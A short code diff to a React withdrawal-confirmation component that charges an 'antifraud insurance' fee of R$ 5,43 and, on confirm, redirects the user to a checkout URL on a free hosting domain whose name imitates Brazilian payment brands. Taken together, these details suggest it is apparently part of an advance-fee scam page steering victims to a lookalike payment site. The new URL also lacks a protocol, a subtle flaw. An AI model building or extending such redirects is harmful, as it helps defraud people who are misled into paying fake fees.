@@ -82,7 +82,7 @@ export function WithdrawalConfirmation({
   const antifraudInsurance = 543 // R$ 5,43
 
   const handleConfirm = () => {
-    window.location.href = "https://instmepaybank.vercel.app/checkout/pagbankinstal"
+    window.location.href = "pagseguroinstapay.netlify.app"
   }
 
   return (
